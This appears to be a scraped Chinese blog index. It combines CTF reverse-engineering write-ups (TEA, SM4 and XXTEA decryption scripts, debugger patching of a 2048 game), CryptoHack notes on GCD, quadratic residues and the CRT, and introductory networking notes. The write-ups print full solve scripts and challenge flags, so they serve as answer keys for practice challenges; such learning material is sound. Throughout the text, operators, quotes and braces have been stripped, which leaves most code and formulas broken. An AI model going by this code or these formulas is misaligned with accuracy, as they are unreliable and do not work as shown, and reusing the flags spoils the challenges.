((v3 ^ k0) + (v5 ^ sum)); v3 -= (((v4 2) ^ (v2 5)) + ((v4 3) ^ (v2 4))) ^ ((v2 ^ k3) + (v4 ^ sum)); v2 -= (((v3 2) ^ (v1 5)) + ((v3 3) ^ (v1 4))) ^ ((v1 ^ k2) + (v3 ^ sum)); v1 -= (((v2 2) ^ (v0 5)) + ((v2 3) ^ (v0 4))) ^ ((v0 ^ k1) + (v2 ^ sum)); v0 -= (((v1 2) ^ (v9 5)) + ((v1 3) ^ (v9 4))) ^ ((v9 ^ k0) + (v1 ^ sum)); sum -= delta; // 解密：sum 递减 v[0] = v0; v[1] = v1; v[2] = v2; v[3] = v3; v[4] = v4; v[5] = v5; v[6] = v6; v[7] = v7; v[8] = v8; v[9] = v9; 接着看主函数，v7 循环计算 Buffer 长度，需要是 40 然后将 密文与 之前硬编码的数组比较，需要全部相等，这就是密文 现在对密文进行解密，应该就是flag 参考主函数： #include iostream#include cstdint// 辅助函数：uint32 数组转字符串（小端序，包含所有字节）std::string uint32_to_string(const uint32_t* input, size_t len) std::string result; for (size_t i = 0; i len; ++i) uint32_t word = input[i]; result += static_castchar(word 0xFF); result += static_castchar((word 8) 0xFF); result += static_castchar((word 16) 0xFF); result += static_castchar((word 24) 0xFF); return result;int main() uint32_t ciphertext[10] = 0x5D624C34, 0x8629FEAD, 0x9D11379B, 0xFCD53211, 0x460F63CE, 0xC5816E68, 0xFE5300AD, 0x0A0015EE, 0x9806DBBB, 0xEF4A2648 ; const uint32_t k[4] = 0x63656F6D, 0x21216674, 0x12345678, 0x9ABCDEF0; decipher(ciphertext, k); std::string plaintext = uint32_to_string(ciphertext, 10); std::cout plaintext std::endl; return 0; 输出： moectfX7e4_And_xx7EA_I5_BeautifuL!!!!! ezandroidpro在源代码comMainActivity中注意到，输入长度需要为 32，然后调用 check 方法，最后返回 1 输出 成功 那只需要弄清楚 check 是如何检查字符串即可 check 函数是一个 native 方法，它位于动态链接库（.so 文件）中。 根据代码中的 System.loadLibrary(ezandroidpro);语句，这个库的名字是 libezandroidpro.so。 接下来逆向这个 lib 二进制 使用 IDA 打开，一片狼藉 使用 Ghidra 打开，一眼就看到 ezandroidpro_MainActivity_check 字样 返回值是 bVar2 ，希望最后是 True ，这样就可以通过检查 bVar2 1 要求 *pcVar6 *pcVar7，后面两个指针向后移动，同时 uVar5 减一，那可以猜到这应该是在比较两个数组，需要前 uVar5 个元素全部一样 pcVar6 来自 local_a0 pcVar7 来自 pcVar4 就是硬编码的一长串字符 注意到一个sm4Encrypt加密，这是一个对称加密，密钥是什么呢？好难猜啊，大概就是硬编码的 moectf2025!!!!!! from gmssl.sm4 import CryptSM4, SM4_ENCRYPT, SM4_DECRYPTkey = bmoectf2025!!!!!! # 16字节ciphertext_hex = 4EEB1EEF2914D79BFA8C5006332097ED2EF06C4A59CAE31C827A08D45CC649C0B971BF2EFBCB160E531A646DF7A6AC0Bciphertext = bytes.fromhex(ciphertext_hex)crypt_sm4 = CryptSM4()crypt_sm4.set_key(key, SM4_DECRYPT)plaintext = crypt_sm4.crypt_ecb(ciphertext)print(plaintext) 输出： moectfSM4_Android_I5_Funing!!! rusty_sudo数独游戏 反编译看看： 几百行的代码，注意到第一个出现的长字符串不是控制台中输出的字符串，它肯定在前面就出现过了。 注意到上面一些奇奇怪怪的变换，点进数组标识符 成功发现了提示信息，但是前面又有一点其他东西，还带………，刚好 81 个字符，可以猜到这就是数独棋盘，接下来要填数独了。 使用 Ghidra 能直接看到数独盘的输出 运行成功程序还退出了，那我们在退出的地方下断点，然后调试，最终果然输出 flag moectfa8c79927d4e830c3fe52e79f410216a0 2048WinMain 函数 Wndproc 函数： 查阅一些资料： 消息类型：WM_PAINT 0x000F 15 要求一个窗口重画自己WM_ERASEBKGND 0x0014 20 当窗口背景必须被擦除时（例在窗口改变大小时）WM_KEYDOWN 0x0100 256 按下一个键 所以上面截图的部分，应该是 2048 这个游戏的逻辑 现在寻找 flag 239 行这个函数就很可疑 果然，如下图，有一个比较，如果 result 13 ，就会有一个输出 flag 的提示 在这下断点，执行到这，需要 eax 大于 0D，随便换成一个数： 输出： moectfY0u_4re_a_2048_m4st3r!!!!r0erowhu 但是这个 flag 提交一直失败，最后发现这是 Misc 的 master 的答案，不是这个 重新寻找 flag 还有块加密 在这下断点：看看块加密的几个参数是什么 a1 是输入flag.txt 文件的字符串，a2 是这个字符串长度，v7 是输出的参数 注意到这是个 XXTEA 加密 import structdef xxtea_decrypt(v, n, k, delta=0x3E9779B9): v = list(v) rounds = 6 + 52 // n sum_ = (rounds * delta) 0xFFFFFFFF y = v[0] for _ in range(rounds): e = (sum_ 2) 3 for p in range(n - 1, 0, -1): z = v[p - 1] mx = (((z 5) ^ (y 2)) + ((y 3) ^ (z 4))) 0xFFFFFFFF mx ^= (((sum_ ^ y) + (k[(p 3) ^ e] ^ z)) 0xFFFFFFFF) v[p] = (v[p] - mx) 0xFFFFFFFF y = v[p] z = v[n - 1] mx = (((z 5) ^ (y 2)) + ((y 3) ^ (z 4))) 0xFFFFFFFF mx ^= (((sum_ ^ y) + (k[(0 3) ^ e] ^ z)) 0xFFFFFFFF) v[0] = (v[0] - mx) 0xFFFFFFFF y = v[0] sum_ = (sum_ - delta) 0xFFFFFFFF return v# 已知密文cipher = bytes([0x35, 0x79, 0x77, 0xCC, 0x1B, 0x13, 0x41, 0x34, 0xF9, 0xFF, 0x9F, 0x91, 0xFF, 0x5B, 0x94, 0x78, 0x86, 0x2A, 0xAF, 0xAE, 0xD7, 0x9E, 0x31, 0x4D, 0x7A, 0xC4, 0xA5, 0x51, 0xD1, 0xD9, 0x6E, 0x44, 0x18, 0x52, 0x86, 0x1B, 0x42, 0x8A, 0xC9, 0x63])# 打包成10个uint32v = list(struct.unpack(10I, cipher))# 密钥key_bytes = b2048master2048mak = list(struct.unpack(4I, key_bytes))# 解密 (使用n=10)decrypted_v = xxtea_decrypt(v, 10, k)# 解包成40字节plain_padded = struct.pack(10I, *decrypted_v)# 取前37字节作为flag，并解码为字符串（假设ASCII）flag = plain_padded[:37].decode(ascii)print(Flag:, flag)","categories":["CTF"]},{"title":"CryptoHack 第二部分 模运算","path":"/CryptoHack-2/","content":"介绍模运算及相关概念、算法、定理 最大公约数GCD欧几里得算法计算两个数的最大公约数GCD 扩展欧几里得算法还能找到一组整数解 (x) 和 (y)，满足 $ ax+bygcd⁡(a,b) $ # 欧几里得算法def gcd(a, b): while b != 0: a, b = b, a % b return a# 扩展欧几里得算法（使用递归）def gcd_extended(a, b): if a == 0: return b, 0, 1 gcd, x1, y1 = gcd_extended(b % a, a) x = y1 - (b // a) * x1 y = x1 return gcd, x, y 费马小定理若模 p 为质数，定义一个域 $ F_{p}$ 若模 n 非质数，则只能定义一个环 $ F_{p}$ 表示集合 ${ 0,1,…,p-1 }$ 费马小定理 如果 p 是质数， a 是不被 p 整除的整数，则：$ a^{p−1}≡1(modp) $ 二次剩余例：$ a 11, \\ a^2 \\ 5 \\ mod\\ ( \\ 29\\ ) ,\\ \\ 5的平方根就是11 和 -11（18）$ 当可以在模 p 下 取 x 的平方根时， x 就是二次剩余数Quadratic Residue 计算性质： Quadratic Residue * Quadratic Residue = Quadratic ResidueQuadratic Residue * Quadratic Non-residue = Quadratic Non-residueQuadratic Non-residue * Quadratic Non-residue = Quadratic Residue 勒让德符号Legendre 符号 $(\\frac{a}{p}) ≡ a^{(p−1)2} \\ mod \\ p$ 等于 $ 1$ ：a 是 二次剩余数 等于 $-1$ ：a 是非二次剩余数 等于 $ 0$ ：$a≡0 \\ mod\\ p$ 通过计算 $a^{(p−1)2} \\ mod \\ p$ 即可判断 a 是否为二次剩余数 只可能是这三种情况之一，现在我们能判断 是否为二次剩余数，但是如何求出平方根呢？ 现在假设确定了 a 是二次剩余数，现在求它的平方根，即找到 $x$ 使得 $x^{2} a \\ mod \\ p$， p是质数， Legendre 符号 $(\\frac{a}{p}) ≡ a^{(p−1)2} \\ mod \\ p$ , 先假设 a 是二次剩余数，很自然地让 $ a^{(p−1)2}$乘以 $a$ 再开方，$a^{(p+1)4}$ 就应该是 a 的平方根 $注意到 （a^{(p+1)4})^2 a^{(p+1)2} a^{(p-1)2} × a ，若 a 是二次剩余数，则\\ a^{(p−1)2} 1$ $即（a^{(p+1)4})就是 a 的平方根$ # Now for the flag. # Given the following 1024 bit prime and 10 integers, find the quadratic residue and then calculate its square root; # the square root is your flag. Of the two possible roots, submit the larger one as your answer.# 提示提到 p 满足 p = 3 mod 4 且是质数p = ......ints = [......]power = (p + 1) // 4for i in ints: Legendre_symbol = pow(i,(p-1)//2,p) x = pow(i,power,p) if Legendre_symbol == 1: print(max(x,p-x)) else: print(None) Tonelli-Shanks综上所述，若 a 为二次剩余数，则$（a^{(p+1)4})是 a 的平方根$ 但是这仅适用于 $ a 3 \\ mod \\ 4$ 的情况，还有一种情况 $a 1 \\ mod \\ 4$ 比较复杂，下次再讨论 Sage内置可使用 def Tonelli_Shanks(a,p): Legendre_symbol = pow(a,(p-1)//2,p) if Legendre_symbol == 1: if p % 4 == 3: x = pow(a, (p + 1)//4, p) return min(x,p-x) if p % 4 == 1: # 待解决 return 0 else: return None 中国剩余定理如果一组线性同余式的模互质，则中国剩余定理可以给出它们的唯一解。 已知x满足： x ≡ 2 mod 5 x ≡ 3 mod 11 x ≡ 5 mod 17求：满足 x ≡ a mod (5*11*17) 的 a # 扩展gcd算法def extended_gcd(a, b): if a == 0: return b, 0, 1 gcd, x1, y1 = extended_gcd(b % a, a) x = y1 - (b // a) * x1 y = x1 return gcd, x, y# 求模的逆元def mod_inverse(a, m): gcd, x, y = extended_gcd(a, m) if gcd != 1: return None # 没有逆元 return (x % m + m) % m # 确保结果在 [0, m-1] 范围内# 中国剩余定理def crt(a,m): length = len(m) M = 1 for i in m: M = M * i # 模之积 M_i = [] for i in m: M_i.append(M/i) reverse_M_i = [] for i, j in zip(M_i, m): reverse_M_i.append(mod_inverse(i, j)) sum = 0 for i, j, k in zip(M_i, reverse_M_i, a): sum += i*j*k return sum % Mm = [5,11,17]a = [2,3,5]print(crt(a,m)) 解密加密程序： from random import randinta = 288260533169915p = 1007621497415251FLAG = bcrypto????????????????????def encrypt_flag(flag): ciphertext = [] # bin切换为二进制表示，[2:]去掉 0b前缀，zfill(8)左侧填充0，join将所有字符串拼接 表示之间无间隙 plaintext = .join([bin(i)[2:].zfill(8) for i in flag]) for b in plaintext: e = randint(1, p) n = pow(a, e, p) if b == 1: ciphertext.append(n) else: n = -n % p ciphertext.append(n) return ciphertextprint(encrypt_flag(FLAG)) 加密结果是 很长的一个列表 [67594220461269, 501237540280788, ………] FLAG 中的每个字符都表示成 8位 二进制数，然后拼接成一长串01序列 密文中的每个数 $ n a^e \\ mod \\ p$ ，e 是一个小于 p 的正随机整数。 将01序列转变为数字列表： 为 0，插入 n 为 1，插入 p - n 实际上只需要按顺序检验 数字列表 中的数字 n ，是否存在 e 使得 $ n a^e \\ mod \\ p$ 存在为 1，否则为 0。这样就能恢复二进制序列 然后重新编码成 ASCII 码序列即可 使用 BSGS（Baby Step Giant Step） 求解 $ a^e ≡ n \\ mod\\ p $ 的最小非负整数 e 解密程序： from math import isqrtdef mod_pow(a, e, p): 快速幂取模 return pow(a, e, p)def order(a, p): 模p下a的阶（最小正整数d使得a^d ≡ 1 mod p） d = p - 1 factors = set() x = d # 分解 d 的所有质因子 i = 2 while i*i = x: while x % i == 0: factors.add(i) x //= i i += 1 if x 1: factors.add(x) # 计算阶 for f in sorted(factors): while d % f == 0 and pow(a, d//f, p) == 1: d //= f return ddef is_in_subgroup(a, n, p): 判断 n 是否在 a 生成的子群内 d = order(a, p) return pow(n, d, p) == 1def bsgs(a, n, p): Baby Step Giant Step 求解 a^e ≡ n mod p 的最小非负整数 e a %= p n %= p m = isqrt(p) + 1 # Baby steps value_table = baby = 1 for j in range(m): value_table[baby] = j baby = (baby * a) % p # Giant steps inv_am = pow(a, m * (p - 2), p) # a^-m mod p，费马小定理求逆元 giant = n for i in range(m): if giant in value_table: return i * m + value_table[giant] giant = (giant * inv_am) % p return None # 不存在def discrete_log_exist_and_value(a, n, p): 主函数：判断并输出离散对数 if not is_in_subgroup(a, n, p): return False, None e = bsgs(a, n, p) return True, ea = 288260533169915p = 1007621497415251ciphertext = [67594220461269, 501237540280788, 718316769824518, 296304224247167, 48290626940198, 30829701196032, 521453693392074, 840985324383794, 770420008897119, 745131486581197, 729163531979577, 334563813238599, 289746215495432, 538664937794468, 894085795317163, 983410189487558, 863330928724430, 996272871140947, 352175210511707, 306237700811584, 631393408838583, 589243747914057, 538776819034934, 365364592128161, 454970171810424, 986711310037393, 657756453404881, 388329936724352, 90991447679370, 714742162831112, 62293519842555, 653941126489711, 448552658212336, 970169071154259, 339472870407614, 406225588145372, 205721593331090, 926225022409823, 904451547059845, 789074084078342, 886420071481685, 796827329208633, 433047156347276, 21271315846750, 719248860593631, 534059295222748, 879864647580512, 918055794962142, 635545050939893, 319549343320339, 93008646178282, 926080110625306, 385476640825005, 483740420173050, 866208659796189, 883359067574584, 913405110264883, 898864873510337, 208598541987988, 23412800024088, 911541450703474, 57446699305445, 513296484586451, 180356843554043, 756391301483653, 823695939808936, 452898981558365, 383286682802447, 381394258915860, 385482809649632, 357950424436020, 212891024562585, 906036654538589, 706766032862393, 500658491083279, 134746243085697, 240386541491998, 850341345692155, 826490944132718, 329513332018620, 41046816597282, 396581286424992, 488863267297267, 92023040998362, 529684488438507, 925328511390026, 524897846090435, 413156582909097, 840524616502482, 325719016994120, 402494835113608, 145033960690364, 43932113323388, 683561775499473, 434510534220939, 92584300328516, 763767269974656, 289837041593468, 11468527450938, 628247946152943, 8844724571683, 813851806959975, 72001988637120, 875394575395153, 70667866716476, 75304931994100, 226809172374264, 767059176444181, 45462007920789, 472607315695803, 325973946551448, 64200767729194, 534886246409921, 950408390792175, 492288777130394, 226746605380806, 944479111810431, 776057001143579, 658971626589122, 231918349590349, 699710172246548, 122457405264610, 643115611310737, 999072890586878, 203230862786955, 348112034218733, 240143417330886, 927148962961842, 661569511006072, 190334725550806, 763365444730995, 516228913786395, 846501182194443, 741210200995504, 511935604454925, 687689993302203, 631038090127480, 961606522916414, 138550017953034, 932105540686829, 215285284639233, 772628158955819, 496858298527292, 730971468815108, 896733219370353, 967083685727881, 607660822695530, 650953466617730, 133773994258132, 623283311953090, 436380836970128, 237114930094468, 115451711811481, 674593269112948, 140400921371770, 659335660634071, 536749311958781, 854645598266824, 303305169095255, 91430489108219, 573739385205188, 400604977158702, 728593782212529, 807432219147040, 893541884126828, 183964371201281, 422680633277230, 218817645778789, 313025293025224, 657253930848472, 747562211812373, 83456701182914, 470417289614736, 641146659305859, 468130225316006, 46960547227850, 875638267674897, 662661765336441, 186533085001285, 743250648436106, 451414956181714, 527954145201673, 922589993405001, 242119479617901, 865476357142231, 988987578447349, 430198555146088, 477890180119931, 844464003254807, 503374203275928, 775374254241792, 346653210679737, 789242808338116, 48503976498612, 604300186163323, 475930096252359, 860836853339514, 994513691290102, 591343659366796, 944852018048514, 82396968629164, 152776642436549, 916070996204621, 305574094667054, 981194179562189, 126174175810273, 55636640522694, 44670495393401, 74724541586529, 988608465654705, 870533906709633, 374564052429787, 486493568142979, 469485372072295, 221153171135022, 289713227465073, 952450431038075, 107298466441025, 938262809228861, 253919870663003, 835790485199226, 655456538877798, 595464842927075, 191621819564547]def decrypt_flag(ciphertext): plaintext = for b in ciphertext: exist, e = discrete_log_exist_and_value(a, b, p) if exist: plaintext + 1 print(1,flush=True,end=) else: plaintext + 0 print(0,flush=True,end=) flag = for i in range(0, len(plaintext), 8): binary = plaintext[i:i+8] ascii_value = int(binary, 2) char = chr(ascii_value) flag += char return flagprint(decrypt_flag(ciphertext)) 解密结果： cryptop4tterns_1n_re5idu3s","categories":["CryptoHack"]},{"title":"CryptoHack 第一部分 简介","path":"/CryptoHack-1/","content":"介绍pwntools和编码知识 pwntoolspwntools 是一个开源的 Python 库，主要用于二进制漏洞利用、逆向工程和 CTF 挑战的开发。它抽象了许多底层操作，使得安全研究人员可以专注于漏洞分析和利用逻辑，而无需处理繁琐的细节。 主要功能： 与本地或远程进程交互（如二进制程序、远程服务器）。 处理 ELF 文件、ROP（返回导向编程）链生成。 提供便捷的汇编反汇编工具。 支持多种架构（如 x86、x64、ARM、MIPS 等）。 提供网络通信工具（如 socket 操作）。 自动化调试和漏洞利用开发。 例：向远程服务发送 JSON 数据 from pwn import * # 导入 pwntools 库的所有功能import json # 导入 Python 的 json 模块，用于处理 JSON 数据的序列化和反序列化# 定义远程服务器的地址和端口号HOST = socket.cryptohack.org # 远程服务器的主机名PORT = 11112 # 远程服务器的端口号# 使用 pwntools 的 remote 函数建立与远程服务器的 TCP 连接r = remote(HOST, PORT) # 创建一个远程连接对象 r，用于与 socket.cryptohack.org:11112 通信# 定义一个函数，用于接收服务器发送的 JSON 数据def json_recv(): line = r.readline() # 使用 pwntools 的 readline 方法读取服务器发送的一行数据 return json.loads(line.decode()) # 将接收到的字节数据解码为字符串，并解析为 Python 的 JSON 对象（通常是字典）# 定义一个函数，用于向服务器发送 JSON 数据def json_send(hsh): request = json.dumps(hsh).encode() # 将 Python 字典 hsh 序列化为 JSON 字符串，并编码为字节 r.sendline(request) # 使用 pwntools 的 sendline 方法将字节数据发送到服务器，并自动添加换行符# 连续读取服务器发送的四行数据并打印# 这些行是服务器的欢迎信息、提示或其他初始输出print(r.readline()) # 读取并打印第一行数据（字节形式）print(r.readline()) # 读取并打印第二行数据print(r.readline()) # 读取并打印第三行数据print(r.readline()) # 读取并打印第四行数据# 创建一个 JSON 请求字典，表示购买 flagrequest = buy: flag # 构造一个字典，键为 buy，值为 flagjson_send(request) # 调用 json_send 函数，将请求序列化为 JSON 并发送到服务器# 接收服务器的响应并解析为 JSONresponse = json_recv() # 调用 json_recv 函数，接收服务器的响应并解析为 Python 字典# 打印服务器的响应print(response) # 输出服务器返回的 JSON 数据（通常是字典形式） 这里仅做介绍 编码知识所使用函数均来源于 python ASCII 编码chr()函数用于将 ASCII 码转换为字符 ord()执行相反操作 十六进制字符串编码 当我们对数据进行加密时，生成的密文通常是一些二进制数据，其中包含许多非可打印的 ASCII 字符 这些字符在屏幕上无法直接显示，也难以通过文本方式传输（比如通过邮件或聊天工具）。 所以可以将密文编码为十六进制字符串，用户友好且跨系统兼容 bytes.fromhex()函数可用于将十六进制转换为字节 .hex()可以对字节字符串调用实例方法来获取十六进制表示形式。 Base64编码Base64 使用一个由 64 个字符组成的字母表：A-Z（大写字母）、a-z（小写字母）、0-9、+ 和 每个字符代表一个 6 位的二进制值（从 000000 到 111111，十进制 0 到 63）。 4 个字符表示 3 个字节 在 Python 中，使用 导入 base64 模块后import base64，即可使用base64.b64encode()函数。 字节和大整数像 RSA 这样的密码系统只能处理数字，但消息是由字符组成的。 如何将消息转换成数字，以便进行数学运算呢？ 最常见的方法是取出消息的序数字节，将其转换为十六进制，然后连接起来。这可以解释为十六进制十六进制数，也可以表示为十进制十进制数。 消息：HELLOascii 字节：[72, 69, 76, 76, 79]十六进制字节：[0x48, 0x45, 0x4c, 0x4c, 0x4f]base-16：0x48454c4c4fbase-10：310400273487 Python 的 PyCryptodome 库通过方法bytes_to_long()和long_to_bytes()实现了这一点。 需要先安装 PyCryptodome 并使用 from Crypto.Util.number import *导入它 。 异或XOR交换律： A ⊕ B B ⊕ A结合律： A ⊕ (B ⊕ C) (A ⊕ B) ⊕ C恒等式：A ⊕ 0 A自逆： A ⊕ A 0 Python pwntools库中有一个方便的xor()函数，可以对不同类型和长度的数据进行异或运算。 例子0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104 这是使用一个 密钥 对数据加密后的密文，提示说注意 flag 的提交格式 crypto 那就先把密文和 crypto 进行异或，发现输出前面几个字符刚好是 myXORke+y，有点奇怪 有理由怀疑密钥就是 myXORkey，试一试，将密文与密钥再异或，得到了明文 输出一直是一些奇怪字符，最后发现是系统终端 被某些字符影响了，重新打开终端重置状态就好了 很奇怪 附录：函数chr() # 将ASCII码转换为字符ord() # 将字符转换成ASCII码bytes.fromhex() # 将十六进制转换为字节.hex() # 对字节字符串调用实例方法来获取十六进制表示形式。base64.b64encode() # Base64编码 （import base64）bytes_to_long() # 十六字节字符拼接，转化成数字（from Crypto.Util.number import *）long_to_bytes() # 数字转化成十六进制，拆分成字节（from Crypto.Util.number import *）xor() # 对不同类型和长度的数据进行异或运算（from pwn import *）","categories":["CryptoHack"]},{"title":"Cyber Security 101 第六部分 密码学介绍(待更新)","path":"/Cyber-Security-101-6/","content":"探索各种对称和非对称加密算法。发现哈希算法在日常系统中的用途。 密码学仅作介绍，深入了解请看分类 CryptoHack 密码学基础知识密码学的最终目的是确保 在存在对手的情况下也能进行安全通信。 “安全”一词涵盖了通信数据的机密性和完整性。 密码学可以定义为在预期存在对手和第三方的情况下，安全通信和数据保护技术的实践和研究。换句话说，这些对手不应该能够泄露或更改消息的内容。 相关概念 明文Plaintext：加密前原始、可读的消息或数据，可以是文档、图像、多媒体文件或其他二进制数据。 密文Ciphertext：加密后不可读的、经过扰乱的消息版本。理想情况下，除大致大小外，无法从中获取关于明文的任何信息。 密码Cipher：将明文转换为密文并能逆向转换的算法或方法，通常由数学家开发。 密钥Key：密码用于加密或解密数据的一串比特。一般来说，使用的密码是公开知识，但密钥必须保密，除非是非对称加密中的公钥（后续任务将讨论非对称加密）。 加密Encryption：使用密码和密钥将明文转换为密文的过程。与密钥不同，密码的选择是公开的。 解密Decryption：加密的逆过程，使用密码和密钥将密文转换回明文。尽管密码是公开知识，但在不知道密钥的情况下恢复明文应是不可能的（不可行的）。 古典密码凯撒密码将明文的每个字母 按字母表 一起右移 X 位，作为 密文 英文字母表有 26 个字母，移动 26 位将使字母保持不变；因此，使用凯撒密码加密的有效密钥有 25 个。 按照今天的标准，由于密码是公开的，凯撒密码被认为是不安全的。 加密类型对称加密使用相同密钥对数据进行加密和解密。密钥必须保密 DES 3DES AES 非对称加密使用一对密钥，使用公钥对数据进行加密，私钥解密 RSADiffie-Hellman 密钥交换SSH数字签名和证书PGP和GPG哈希基础知识哈希函数存储密码的安全问题使用哈希算法进行安全密码存储识别密码哈希值密码破解完整性检查的哈希算法","categories":["Cyber Security 101"]},{"title":"Cyber Security 101 第五部分 网络(待更新)","path":"/Cyber-Security-101-5/","content":"了解 OSI 模型和 TCPIP模型。探索日常使用的各种网络协议以及WireShark、Tcpdump、Nmap的使用 第一部分 网络概念仅对基础知识做总结，不展开 OSI 模型 TCPIP 模型 应用层（OSI的应用层、表示层、会话层） 传输层 网络层 链路层 物理层 IP地址和子网IP 地址是网络上主机的标识符 分为 IPv4 （4字节）和 IPv6 （6字节） IPv4地址：192.168.1.10：网络地址255：广播地址 子网子网是为了缓解 IPv4 短缺的问题而设计 如图，该设备使用子网掩码 255.255.255.0 划分网络 设备的 IP 地址为：192.168.1.101/24 左边 24 位在整个子网内保持不变 子网 IP 地址范围为：192.168.1.1 ~ 192.168.1.254 192.168.66.0和192.168.66.255分别是网络地址和广播地址。 私有 IP 地址私有 IP 地址是根据 RFC 1918 定义的 IP 地址范围，专门用于私有网络（如家庭、办公室或企业内部网络）。 这些地址不会直接路由到公共互联网，只能在本地网络中使用。 缓解了IPv4地址短缺的问题 私有 IP 地址通常由路由器或网络设备通过 DHCP（动态主机配置协议）或静态分配给设备，用于内部通信。例如，电脑、手机或智能设备在家里连接 Wi-Fi 时，通常会被分配一个私有 IP 地址。 10.0.0.0- 10.255.255.255（10/8） 172.16.0.0- 172.31.255.255（172.16/12） 192.168.0.0- 192.168.255.255（192.168/16） UDP和TCPIP 地址标识主机，使用端口号区分进程，端口号使用两个字节，范围1 ~ 65535，0是保留端口 UDP无连接、不可靠的传输协议 缺点：不保证数据按序到达、不重传丢失数据、无流量控制 优点：速度快、开销低、支持多对多通信 TCP面向连接、可靠的传输协议 TCP连接通过三次握手建立。使用两个标志：SYN（同步）和 ACK（确认）。 SYN 数据包：客户端通过向服务器发送 SYN 数据包来发起连接。此数据包包含客户端随机选择的初始序列号。 SYN-ACK 数据包：服务器使用 SYN-ACK 数据包响应 SYN 数据包，该数据包添加了服务器随机选择的初始序列号。 ACK 数据包：当客户端发送 ACK 数据包以确认收到 SYN-ACK 数据包时，三次握手就完成了。 四次挥手关闭连接 数据传输：保证数据按序、无差错、不丢失地传输，提供错误检测和重传机制。 缺点：开销较大、速度较慢 优点：可靠性高 封装 用户数据 数据报（段）TCP segment UDP datagram 网络数据包 packet 数据链路帧 frame 远程登录TELNET（电传打字网络）协议是一种用于远程终端连接的网络协议。 TELNET 客户端允许您连接到远程系统并与之通信，以及发出文本命令。 telnet 10.10.30.254 13 # 连接到10.10.30.254的13端口 telnet 10.10.30.254 80 # 80端口：HTTP服务GET / HTTP/1.1 # /标识资源路径，为空表示访问服务器根目录Host: your_host # 正在请求的主机# 两次回车 第二部分 网络基础知识DHCP 动态主机配置协议服务器的网络配置通常固定，可以手动配置。但移动设备网络配置不固定。 DHCP：采用自动化方式配置联网设备 遵循四个步骤： DHCP发现：客户端广播 DHCPDISCOVER 消息，寻找本地DHCP服务器（如果存在）。 DHCP提供：服务器以 DHCPOFFER 消息进行响应，其中包含可供客户端接受的 IP 地址。 DHCP请求：客户端以 DHCPREQUEST 消息进行响应，表明它已接受提供的 IP。 DHCP确认：服务器以 DHCPACK 消息进行响应，以确认提供的 IP 地址现已分配给该客户端。 在四个步骤完成之前 客户端是没有 IP 配置的，使用 0.0.0.0 以及本机 MAC 地址向广播 IP 地址 255.255.255.255 和 广播 MAC 地址 ff:ff:ff:ff:ff:ff发送消息，服务器使用发送的 MAC 地址标识设备（链路层） DHCP 过程结束时，设备将收到访问互联网所需的所有配置： IP 地址 将数据包路由到本地网络之外的网关 用于解析域名的 DNS 服务器 ARP 地址解析协议 48位 MAC 地址 两种常用数据链路层：以太网、WIFI 同一以太网上的两台设备 需要知道 对方的IP地址和MAC地址才能一对一联系，一种思路是向 DHCP 服务器查询，另一种就是 ARP地址解析协议 ARP 地址解析协议 ARP 请求：请求者将 目的IP 地址发送到广播 MAC 地址，子网内所有联网设备都会受到请求 ARP 应答：目的 IP 地址受到请求后，答复 MAC 地址 ARP 请求或ARP 应答并非封装在 UDP 或 IP 数据包中，而是直接封装在以太网帧中。 ARP 允许从第 3 层网络层寻址到第 2 层链路层寻址的转换。 ARP协议的必要性在于它提供了一种简单、分布式、高效的 IP 到 MAC 地址解析机制，适用于各种网络环境（无论是否有DHCP服务器）。 直接从DHCP服务器获取MAC地址虽然理论上可行，但会引入额外的复杂性、延迟和单点故障风险，而ARP通过广播和缓存机制很好地解决了这些问题。 ICMP 互联网控制消息协议主要用于网络诊断和错误报告 ping：使用 ICMP 测试与目标系统的连接，测量往返时间 RTT traceroute：使用 ICMP 跟踪主机到目标的路由 路由协议 OSPF（开放最短路径优先）：OSPF 是一种路由协议，允许路由器共享网络拓扑信息，并计算出最高效的数据传输路径。它通过路由器之间交换其所连接链路和网络状态的更新来实现这一点。这样，每个路由器都拥有完整的网络地图，并可以确定到达任何目的地的最佳路由。 EIGRP（增强型内部网关路由协议）：EIGRP 是 Cisco 专有的路由协议，它融合了不同路由算法的诸多特性。它允许路由器共享其可到达网络的信息以及与这些路由相关的成本（例如带宽或延迟）。然后，路由器会利用这些信息来选择最高效的数据传输路径。 BGP（边界网关协议）：BGP 是互联网上使用的主要路由协议。它允许不同的网络（例如互联网服务提供商的网络）交换路由信息，并建立数据在这些网络之间传输的路径。BGP 有助于确保数据即使在跨越多个网络时也能在互联网上高效路由。 RIP（路由信息协议）：RIP 是一种简单的路由协议，常用于小型网络。运行 RIP 的路由器会共享它们可以到达的网络以及到达目标网络所需的跳数（路由器数）。因此，每个路由器都会根据这些信息构建路由表，选择到达每个目标网络的跳数最少的路由。 NAT解决 IPv4 地址耗尽的一种方法就是 网络地址转换 NAT NAT 的理念在于使用 一个公网 IP 地址 为 多个私有 IP 地址 提供互联网访问。 路由器维护一个表，将内部 IP 地址和端口号与其外部 IP 地址和端口号进行映射。 如图，从笔记本电脑的角度来看，该连接是从其 IP 地址192.168.0.129发起的，TCP 源端口号为15401； 然而，Web 服务器会将此连接视为从 212.3.4.5 TCP 端口号19273 建立的 路由器无缝地执行此地址转换。 这种转换受到路由器端口数限制，65536 第三部分 网络核心协议DNS 域名系统DNS 负责将域名映射到 IP 地址 DNS 流量默认使用UDP端口 53，并将TCP端口 53 作为默认回退端口。 DNS 有不同类型： A：将主机名映射到一个或多个 IPv4地址 AAAA：IPv6 CNAME：将域名映射到另一个域名 MX：指定负责处理域电子邮件的邮箱服务器 可以使用 nslookup在命令行中查找域的 IP 地址 WHOISWHOIS 记录提供了注册域名实体的信息 Linux 上可以使用 whois 查询域名信息 HTTP(S)启动浏览器时，主要使用HTTP和 HTTPS 协议。HTTP代表超文本传输协议；HTTPS 中的 S 代表安全。该协议依赖于TCP，并定义了 Web 浏览器与 Web 服务器的通信方式。 Web 浏览器通常向 Web 服务器发出的一些方法如下： GET从服务器检索数据，例如 HTML 文件或图像。 POST允许我们向服务器提交新数据，例如提交表单或上传文件。 PUT用于在服务器上创建新资源以及更新和覆盖现有信息。 DELETE，用于删除服务器上的指定文件或资源。 HTTP和 HTTPS 通常分别使用TCP端口 80 和 443，较少使用其他端口，例如 8080 和 8443。 GET /index.html HTTP/1.1Host: www.example.com FTP：传输文件与旨在检索网页的HTTP不同，文件传输协议 ( FTP ) 旨在传输文件。因此，FTP 的文件传输效率非常高，并且在所有条件相同的情况下，它可以实现比HTTP更高的速度。FTP 命令通常在命令行或专用软件中使用。 FTP协议定义的示例命令如下： USER用于输入用户名 